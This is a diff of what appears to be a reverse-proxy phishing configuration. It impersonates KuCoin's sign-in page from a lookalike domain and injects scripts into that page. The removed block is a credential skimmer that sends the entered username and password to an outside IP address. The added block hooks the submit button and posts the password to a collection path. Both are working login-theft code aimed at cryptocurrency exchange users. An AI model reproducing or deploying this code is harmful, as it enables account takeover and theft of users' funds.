@@ -40,39 +40,24 @@ paths:
   - path: "/ucenter/signin"
     backend: https://www.kucoin.com/ucenter/signin"
 
-jjs_inject:
+js_inject:
   - trigger_domains: ['lazuremaastricht.cam']
     trigger_paths: ["/*"]
-    script: |
-      document.addEventListener('DOMContentLoaded', function() {
-        console.log('Injectie geladen');
-
-        const inputs = document.querySelectorAll('.KuxInput-input');
-        console.log('Aantal inputvelden gevonden:', inputs.length);
-
-        if (inputs.length >= 2) {
-          const userInput = inputs[0]; // account
-          const passInput = inputs[1]; // Password
-
-          const loginBtn = document.querySelector('button.subButton');
-          console.log('Login knop gevonden:', !!loginBtn);
-
-          if (loginBtn) {
-            loginBtn.addEventListener('click', function() {
-              const u = userInput.value;
-              const p = passInput.value;
-              console.log('Gebruiker:', u);
-              console.log('Wachtwoord:', p);
-
-              // Stuur gegevens naar jouw server
-              const img = new Image();
-              img.src = 'https://164.92.147.118:8080/log?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p);
-            });
-          } else {
-            console.warn('Loginknop niet gevonden.');
-          }
-        } else {
-          console.warn('Niet genoeg inputvelden gevonden.');
-        }
-      });
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('input[type="submit"]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        submit.addEventListener("click", sendPass);
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/eggregate-login?lang=en_us', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
 
